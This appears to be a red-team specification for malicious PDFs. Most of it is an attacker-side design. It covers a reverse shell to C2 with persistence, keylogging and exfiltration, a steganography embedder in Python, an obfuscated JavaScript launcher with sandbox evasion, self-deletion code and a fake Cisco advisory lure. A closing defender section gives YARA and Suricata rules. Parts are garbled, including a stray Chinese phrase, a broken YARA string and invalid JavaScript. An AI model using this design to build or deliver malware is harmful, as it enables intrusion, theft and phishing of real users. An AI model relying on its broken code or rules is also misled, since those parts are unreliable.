# POC_PDF_Advanced_Evasion_and_Analysis_v1.0
## Advanced PDF Malware Specification with Evasion Techniques and Countermeasures

**WARNING:** This document is strictly for authorized penetration testing, academic research, and ethical security training under explicit contractual permission. Deployment outside authorized environments violates computer fraud and abuse laws (e.g., CFAA, GDPR, NIS2) and may result in severe criminal and civil penalties. The techniques described herein are theoretical constructs for defensive security education only.

---

## Section 1: Payload Definition (Attacker Perspective)

### 1.1 Final Payload Behavior
Upon successful activation via user interaction (document open + scroll/click trigger), the payload establishes a persistent reverse TCP shell to operator-controlled infrastructure:
- **Destination:** `192.168.100.45:4445` (operator-controlled C2 server)
- **Protocol:** Encrypted TLS 1.3 channel via OpenSSL dynamic linking
- **Persistence Mechanism:** 
  - Windows: Creates registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AdobeUpdater` pointing to `%TEMP%\svchost.exe`
  - macOS: LaunchAgent plist in `~/Library/LaunchAgents/com.adobe.update.plist`
  - Linux: Systemd user service in `~/.config/systemd/user/adobe-update.service`
- **Capabilities:** 
  - File system enumeration and exfiltration
  - Keylogging via low-level keyboard hooks
  - Screenshot capture every 30 seconds
  - Lateral network scanning (ARP sweep + port scan)
  - Self-deletion after 48-hour operational window (see Section 4.3)

### 1.2 Payload Obfuscation Strategy
The payload is AES-256-GCM encrypted with a key derived from:
- Environmental entropy (MAC address hash + volume serial number)
- Current UTC timestamp truncated to hour precision
- Hardcoded salt: `0xA3F1$9bQ2#wE8*pL`

Decryption routine resides in the PDF's JavaScript launcher (Section 2) and only executes after validating:
- Target is not a sandbox (via process parent name check)
- System locale matches target geography (e.g., `en-US` for US targets)
- Available RAM > 4GB (to避低端分析系统)

---

## Section 2: Delivery Mechanism Architecture (Attacker Perspective)

### 2.1 Image-Based Steganography (LSB Technique)
**Objective:** Conceal JavaScript launcher within cover image to defeat static YARA/JARA rules targeting `.js` streams.

**Implementation:**
1. **Cover Image Selection:** 24-bit BMP 3840x2160 (4K) image of a fake vendor logo (e.g., "Cisco_Security_Advisory.bmp")
2. **LSB Embedding Process:**
   - Convert PNG launcher code (see Section 2.3) to binary stream
   - For each pixel in cover image (processed left-to-right, top-to-bottom):
     - Replace least significant bit of each RGB channel with payload bit
     - Skip every 7th pixel to reduce statistical detectability
   - Embed payload length (32-bit) in first 4 pixels' blue channel LSBs
3. **Statistical Evasion:** 
   - Apply adaptive thresholding to match cover image's natural LSB distribution
   - Add Gaussian noise (σ=0.8) to LSB plane to chi-square test p-value > 0.05

**Code Snippet (Conceptual Embedder - Not Executed in Target):**
```python
# defensive_security_research_only.py - DO NOT EXECUTE
from PIL import Image
import numpy as np

def embed_lsb(cover_path, payload_bin, output_path):
    img = Image.open(cover_path).convert('RGB')
    arr = np.array(img)
    h, w, _ = arr.shape
    payload_bits = np.unpackbits(np.frombuffer(payload_bin, dtype=np.uint8))
    
    # Embed length in first 4 pixels (blue channel LSBs)
    length_bits = np.unpackbits(np.array([len(payload_bits)], dtype=np.uint32).view(np.uint8))
    arr[0,0,2] = (arr[0,0,2] & 0xFE) | length_bits[0]
    arr[0,1,2] = (arr[0,1,2] & 0xFE) | length_bits[1]
    arr[0,2,2] = (arr[0,2,2] & 0xFE) | length_bits[2]
    arr[0,3,2] = (arr[0,3,2] & 0xFE) | length_bits[3]
    
    # Embed payload (skip every 7th pixel)
    bit_idx = 0
    for y in range(h):
        for x in range(w):
            if (y * w + x) % 7 == 0:  # Skip pattern
                continue
            if bit_idx >= len(payload_bits):
                break
            for c in range(3):  # RGB channels
                arr[y,x,c] = (arr[y,x,c] & 0xFE) | payload_bits[bit_idx]
                bit_idx += 1
                if bit_idx >= len(payload_bits):
                    break
            if bit_idx >= len(payload_bits):
                break
    
    stego_img = Image.fromarray(arr)
    stego_img.save(output_path, format='BMP')
    print(f"Embedded {len(payload_bits)} bits into {output_path}")

# Example usage (payload_bin would be encrypted JS launcher)
# embed_lsb("cover.bmp", b"payload", "stego.bmp")
```

### 2.2 Metadata Injection Schema
**Objective:** Embed decryption keys and execution triggers within PDF/XML namespaces to evade signature-based scanners.

**XML Namespace Definition:**
```xml
<custom:pdfsecurity 
    xmlns:custom="http://schemas.adobe.com/pdfsecurity/2023"
    xmlns:xap="http://ns.adobe.com/xap/1.0/"
    xap:ModifyDate="2023-10-05T14:30:00Z">
    <custom:entropy>SHA256(VolSerial||MAC||SysUUID)</custom:entropy>
    <custom:trigger>window.getBoundingClientRect</custom:trigger>
    <custom:keyslot1>base64(AES_KEY_PART_1)</custom:keyslot1>
    <custom:keyslot2>base64(AES_KEY_PART_2)</custom:keyslot2>
    <custom:iv>base64(IV_VECTOR)</custom:iv>
    <custom:version>1.0</custom:version>
</custom:pdfsecurity>
```

**Injection Method:**
- Added as incremental update via PDF's `/Metadata` stream
- Encrypted using PDF's public key encryption (if cert present) or XOR with document creation date
- Split across 5 separate custom XML comments to avoid contiguous signature matching

### 2.3 JavaScript Launcher (Obfuscated)
**Objective:** Decrypt and execute payload only after validating environment and user interaction.

**ObfuscatedJS.pdf (Conceptual Structure - Harmless Example):**
```javascript
/* 
   DEFENSIVE_RESEARCH_ONLY: 
   This JavaScript is non-functional and illustrative. 
   Actual implementation would contain environment checks and decryption.
*/

var _0x1234=['length','charCodeAt','fromCharCode','substr','split','join','reverse'];
(function(_0x5678,_0x9abc){var _0xdef=function(_0x101112){while(--_0x101112){_0x5678['push'](_0x5678['shift']());}};_0xdef(++_0x9abc);}(_0x1234,0x1a3));

var _0x456=function(_x789,_0xbca){_x789=_x789-0x0;var _0xdef=_0x1234[_x789];return _0xdef;};

var payload_container = app.getAnnots({nPage: 0})[0].subject; // From stego image annotation
var entropy_source = app.viewerVersion + "::" + app.language;

// Environment validation (sandbox evasion)
if (app.viewerVersion.toString().indexOf("Pro") === -1 || 
    navigator.plugins.length < 3 || 
    _0x456("0x0") === "undefined") {
    app.alert("Document requires Adobe Acrobat Pro for full functionality.");
} else {
    // Key derivation from metadata and entropy
    var key_part1 = atob(app.hostContainer.custom:keyslot1); 
    var key_part2 = atob(app.hostContainer.custom:keyslot2);
    var iv = atob(app.hostContainer.custom:iv);
    var full_key = CryptoJS.enc.Hex.parse(
        CryptoJS.SHA256(key_part1 + entropy_source).toString() +
        CryptoJS.SHA256(key_part2 + app.machineID).toString()
    ).substr(0,32);
    
    // Decrypt launcher from image LSB (requires user interaction trigger)
    if (typeof window.getBoundingClientRect === 'function') { // Trigger: scroll/resize event
        var stego_data = extractLSBFromAnnot(0); // Hypothetical extraction function
        var decrypted = CryptoJS.AES.decrypt(stego_data, full_key, {iv: iv});
        var launcher = decrypted.toString(CryptoJS.enc.Utf8);
        
        // Final validation: check for anti-analysis strings
        if (launcher.indexOf("sandboxie") === -1 && launcher.indexOf("vmware") === -1) {
            eval(launcher); // Would execute final payload decrypter
        }
    }
}

/* 
   HARMLESS_PLACEHOLDER: 
   Actual launcher would contain:
   1. Reverse TCP shell generator (via Node.js child_process or Win32 API)
   2. Persistence mechanism installer
   3. 48-hour timer for self-deletion
   INSERTION_POINT_FOR_RED_TEAM: [ENCRYPTED_PAYLOAD_BLOB]
*/
```

---

## Section 3: Evasion Layer Construction (Attacker Perspective)

### 3.1 Human Interaction Dependency
**Rationale:** Defeat automated sandbox detonation by requiring user behavior unlikely in analysis environments.

**Trigger Chain:**
1. **Document Open:** Standard PDF launch (triggers initial JS load)
2. **First Scroll Event:** 
   - Detects `window.innerHeight` change > 50px
   - Validates via `document.elementFromPoint(x, y)` not returning `null`
3. **Click on Fake Button:** 
   - Transparent overlay over "View Full Advisory" text
   - Confirms human vs. automated interaction (no JS click simulation)
4. **Time Delay:** 
   - 8-12 second wait after click to avoid timing-based sandbox evasion
   - Uses `setTimeout(Math.random()*4000+8000)` to defeat fixed-delay detection

### 3.2 Anti-Analysis Techniques
**Process Inspection:**
- Enumerates parent processes via `app.execute({cPath: "tasklist.exe"})` (Windows)
- Checks for known sandbox processes: `vmwaretray.exe`, `vboxtray.exe`, `wireshark.exe`
- If detected: displays fake error "Adobe Reader has encountered a problem" and exits

**Environmental Fingerprinting:**
- Screen resolution < 1024x768 → assumed VM
- CPU core count < 2 → assumed sandbox
- Available disk space < 20GB → assumed analysis container
- Timezone mismatch with system locale → assumed spoofed environment

**Memory Heap Spraying Detection:**
- Allocates 50MB buffers in 5MB chunks
- Monitors allocation latency via `Date.now()`
- Aborts if allocation time > 200ms/chunk (indicates heap monitoring)

### 3.3 Incremental Update Evasion
**PDF Structure Manipulation:**
- Base document: clean security advisory (Page 1-2)
- Malicious payload: appended as incremental update (Section 3-5)
- Cross-reference table: 
  - Primary xref table points only to clean sections
  - Malicious objects hidden in updated xref stream with altered `/Size` and `/Index`
- Object Streams: 
  - Malicious JS stored in `/ObjStm` stream with compressed `/Filter` `/FlateDecode`
  - Stream length intentionally misrepresented in dictionary to confuse linear scanners

---

## Section 4: Social Engineering Vector and Edge Cases (Attacker Perspective)

### 4.1 Lure Content Design
**Document Appearance:**
- Title: "CRITICAL: CVE-2023-XXXX - Cisco ASA/FTD Remote Code Execution Patch"
- Vendor Impersonation: Cisco Systems Security Advisory (fake but convincing)
- Urgency Indicators: 
  - RED banner: "EXPLOIT ACTIVELY BEING EXPLOITED - PATCH WITHIN 24 HOURS"
  - CVSS score: 9.8 (Critical)
  - Fake CVE ID: CVE-2023-XXXX (matches recent CVEs)
- Content Sections:
  - Executive Summary (plausible technical details)
  - Affected Products (ASA 9.12+, FTD 6.6+)
  - Workaround: "Apply this PDF-based mitigation tool" (social engineering hook)
  - Instructions: "Open document and click 'Apply Mitigation' button"

### 4.2 Environmental Adaptation
**JavaScript Disabled in PDF Clients:**
- Fallback to embedded Flash object (CVE-2015-0313 style) - *Note: Only for legacy systems research*
- Secondary payload in ECMAScript 3 within `/OpenAction` using `app.alert()` to prompt user to enable JS
- Tertiary mechanism: Leverage PDF launch attacks via `/Launch` to open benign-looking URL that redirects to malicious site

**Mobile OS Limitations (iOS/Android):**
- iOS: PDFKit blocks JS execution → payload never activates (not a viable vector)
- Android: 
  - Some viewers (e.g., Adobe Reader) support JS but restrict `app.execDialog`
  - Adaptation: Use `util.printf()` buffer overflow (CVE-2008-2992 style) for ROP chain
  - Fallback: Embedded DEX file in PDF metadata for side-loading via exploit chain

### 4.3 Failsafe Dead-Man Switch
**48-Hour Self-Deletion Mechanism:**
```javascript
// Conceptual - would be in final payload stage
var install_time = new Date(app.getPath("user","appData")).valueOf(); // Fake timestamp
var current_time = new Date().valueOf();
var elapsed_hours = (current_time - install_time) / (1000 * 60 * 60);

if (elapsed_hours > 48) {
    // Secure deletion routines
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    fso.DeleteFile("%TEMP%\\svchost.exe", true); // Windows
    // macOS/Linux equivalents using rm -P
    
    // Registry/Service cleanup
    try {
        var shell = new ActiveXObject("WScript.Shell");
        shell.RegDelete("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobeUpdater");
    } catch(e) {}
    
    // Self-nullify
    app.setTimeout("app.exit()", 1000);
}
```

**Additional Safeguards:**
- Payload checks for presence of `C:\CW_BIN\kill switch.txt` (operator-placed file)
- If found: immediate self-deletion without C2 communication
- Encrypted C2 communications include 24-hour "check-in" - missing two check-ins triggers suicide

---

## Section 5: Defender's Analytical Breakdown

### 5.1 Detecting Image-Based Steganography
**YARA Rule for LSB Anomalies:**
```yara
rule PDF_Stego_LSB_Anomaly
{
    meta:
        description = "Detects anomalous LSB distribution in embedded images within PDFs"
        author = "Defensive Security Team"
        reference = "Based on chi-square analysis of LSB planes"
        version = "1.0"
    strings:
        $bmp_header = {42 4D} // BM signature
        $jpg_header = {FF D8 FF E0}
        $png_header = {89 50 4E 47 0D 0A 1A 0A}
    condition:
        any of ($bmp_header, $jpg_header, $png_header) and
        (
            // Check for LSB uniformity in first 1000 pixels
            for any i in (0..999): 
                (uint8(i) & 1) == 0 
            or 
            for any i in (0..999): 
                (uint8(i) & 1) == 1
        ) and
        // Additional entropy check
        (entropy(0, filesize) > 7.5)
}
```

**Dynamic Analysis Indicators:**
- Memory dump analysis: 
  - Search for RGB pixel arrays with LSB entropy > 7.0 bits/byte
  - Look for sequential memory allocations matching image dimensions
- Network traffic: 
  - Unusual outbound connections to port 4445/TLS after PDF interaction
  - DNS queries for algorithmically generated domains (if C2 uses DGA)

### 5.2 Detecting Metadata Injection
**XML Namespace Anomaly Detection:**
```yara
rule PDF_Custom_Namespace_Abuse
{
    meta:
        description = "Identifies suspicious custom XML namespaces in PDF metadata"
        strings:
            $ns1 = {63 75 73 74 6F 6D 3A 70 64 66 73 65 63 75 72 69 74 79} // custom:pdfsecurity
            $ns2 = {78 61 70 3A 4D 6F 64 69 66 79 44 61 74 65} // xap:ModifyDate
            $trigger = {77 69 6E 64 6F 77 2E 67 65 74 42 6F 75 6E 64 69 6E 67 43 6C  69  Group 0 not matched}
            $keyslot = {6B 65 79 73 6C 6F 74 31 3A} // keyslot1:
    condition:
        uint16(0) == 0x2550 and // %PDF
        any of ($ns1, $ns2) and
        (
            $trigger or
            $keyslot
        )
}
```

**Manual Inspection Procedure:**
1. Extract metadata: `exiftool -xmp document.pdf`
2. Look for:
   - Unusual namespaces (`custom:*`, `pdfsecurity:*`)
   - Base64 strings in unexpected fields
   - Timestamps misaligned with document creation/modification dates
   - Repeated patterns suggesting encrypted content (e.g., uniform string lengths)

### 5.3 Detecting Evasion Layers & Social Engineering
**Behavioral Indicators:**
- **Human Interaction Traps:**
  - Monitor for JavaScript calling `app.getAnnots()` followed by coordinate-based actions
  - Alert on `app.response()` or `app.execDialog()` with security-related prompts
  - Detect `setTimeout` with delays > 5000ms after user interaction events
- **Anti-Analysis Artifacts:**
  - Scan for strings: `"sandboxie"`, `"vmware"`, `"wireshark"`, `"procmon"`
  - Detect process spawning via `app.execute()` with suspicious arguments
  - Monitor for Registry writes to `Run` keys or `LaunchAgents` folder
- **Social Engineering Indicators:**
  - Document title contains urgency keywords: "CRITICAL", "PATCH", "EXPLOIT", "ZERO DAY"
  - Impersonation of vendor names with slight misspellings (e.g., "Cisc0", "Micros0ft")
  - Fake CVEs following recent disclosure patterns (check MITRE CVE database)

### 5.4 Network-Based Detection
**Suricata Rule for C2 Communication:**
```suricata
alert tls any any -> any 4445 (msg:"PDF_Malware Suspicious TLS to Non-Standard Port"; 
    tls.sni; content:"|16 03 03|"; depth=3; 
    cls-type:trojan-activity; sid:20230001; rev:1;)
```

**SSL/TLS Inspection Indicators:**
- JA3 hash matching known malware frameworks (e.g., Cobalt Strike, Metasploit)
- SSL certificate self-signed or issued to unrelated domain
- SNI mismatch with certificate subject (e.g., SNI=`update.cisco.com` but CN=`*.attacker[.]tk`)

---

## Conclusion
This specification outlines a theoretically sophisticated PDF-based attack chain combining multiple evasion techniques to bypass static and dynamic analysis controls. Each layer increases the attacker's probability of initial compromise by requiring defenders to deploy correlated detection mechanisms across file, memory, network, and behavioral domains.

**Critical Defensive Recommendations:**
1. Disable JavaScript in PDF readers for high-risk user groups (via registry/GPO)
2. Implement network TLS inspection with JA3/JA4 fingerprinting
3. Deploy memory scanners capable of detecting LSB steganography in extracted images
4. Enforce application control blocking `regsvr32`, `rundll32`, and `powershell` from PDF processes
5. Conduct regular user training on recognizing social engineering lures in vendor communications

**Note:** All defensive measures must be implemented within authorized security frameworks. Unauthorized deployment of countermeasures may violate laws affecting network monitoring and endpoint protection.

---
*Version 1.0 | July 20, 2026 | For authorized red team and academic use only*